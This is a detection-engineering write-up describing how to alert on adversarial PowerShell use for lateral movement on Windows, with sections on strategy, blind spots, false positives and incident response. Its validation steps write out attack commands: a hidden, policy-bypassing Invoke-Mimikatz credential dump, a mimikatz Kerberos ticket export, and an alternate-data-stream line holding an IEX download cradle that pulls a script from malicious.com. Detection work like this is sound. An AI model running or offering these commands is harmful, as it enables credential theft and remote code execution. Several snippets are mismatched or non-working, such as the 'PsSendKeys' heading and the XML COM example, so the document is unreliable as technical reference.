# Alerting & Detection Strategy: Detect Adversarial Use of PowerShell for Lateral Movement

## Goal
This technique aims to detect adversarial attempts leveraging PowerShell for lateral movement within Windows environments. Specifically, it focuses on identifying tactics used by attackers to execute and persist malicious payloads across the network using PowerShell.

## Categorization
- **MITRE ATT&CK Mapping:** T1059.001 - PowerShell
- **Tactic / Kill Chain Phases:** Execution
- **Platforms:** Windows
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1059/001)

## Strategy Abstract
The detection strategy encompasses monitoring and analyzing data sources such as event logs, process activity, network traffic, and PowerShell execution history. Patterns indicative of lateral movement include suspicious command-line arguments, abnormal use of built-in PowerShell commands (e.g., `Invoke-Command`, `IEX`), misuse of Windows Management Instrumentation (WMI), and unusual network communication patterns originating from PowerShell processes.

## Technical Context
Adversaries often exploit PowerShell due to its native presence on Windows systems and its ability to script complex actions. They leverage various techniques such as encoded commands, obfuscation, or leveraging legitimate administrative tools for malicious purposes. Common real-world implementations involve using Mimikatz for credential dumping, executing BloodHound for network mapping, and employing other lateral movement tools like Invoke-AllChecks.

Adversaries may use the following sample commands in their attacks:
- `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Mimikatz"`
- `Invoke-Bloodhound`
- PowerShell scripts executed via encoded command parameters to bypass security controls.

## Blind Spots and Assumptions
- **Blind Spots:** Detection may not cover all obfuscation techniques, particularly those that employ advanced encoding or custom-built payloads.
- **Assumptions:** Assumes standard logging configurations are enabled, and security tools can parse PowerShell logs effectively. It presumes normal network baselines to identify anomalies.

## False Positives
Potential benign activities include:
- Legitimate administrative scripts using similar command structures.
- IT operations teams performing system maintenance or updates that use PowerShell for automation tasks.
- Developers executing debugging scripts with encoded commands.

## Priority
**Priority: High**

Justification: The sophistication and versatility of PowerShell make it a preferred tool for attackers, enabling them to execute complex attacks while evading detection. It can significantly compromise network security if not detected promptly.

## Validation (Adversary Emulation)
To validate this detection strategy in a controlled environment:
1. **Mimikatz:** Execute Mimikatz to dump credentials.
   ```bash
   powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Mimikatz"
   ```

2. **BloodHound Execution:**
   - From local disk:
     ```bash
     Invoke-Bloodhound
     ```
   - From memory using Download Cradle:
     ```powershell
     Invoke-DownloadCradle
     ```

3. **Mimikatz with PsSendKeys:**
   ```bash
   mimikatz.exe 'sekurlsa::kerberos /domain:yourdomain.com /export'
   ```

4. **Invoke-AppPathBypass and Similar Techniques:** Use these methods to bypass execution restrictions.
   
5. **XML-based Command Execution:**
   - Utilize MsXml COM object:
     ```powershell
     $xmldoc = New-Object System.Xml.XmlDocument; $node = $xmldoc.CreateElement('script'); [System.Management.Automation.PSScriptMethod]::New($node, 'Invoke-Command')
     ```

6. **NTFS Alternate Data Stream Access:**
   Use streams to hide scripts:
   ```powershell
   echo "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')" > hidden_script.ps1:stream
   ```

7. **Session Creation and Abuse:** Create sessions with encoded commands for persistence.

8. **Command Parameter Variations:**
   - Use different encoding schemes to evade detection:
     ```powershell
     ATHPowerShellCommandLineParameter -EncodedCommand [Base64 Encoded String]
     ```

## Response
When an alert is triggered, analysts should:
- Immediately isolate affected systems.
- Perform a detailed investigation of the PowerShell logs to understand the scope and nature of execution.
- Review network traffic for any unusual outbound connections or data exfiltration attempts.
- Update detection rules to refine alerts and reduce false positives.
- Engage with incident response teams to mitigate potential damage.
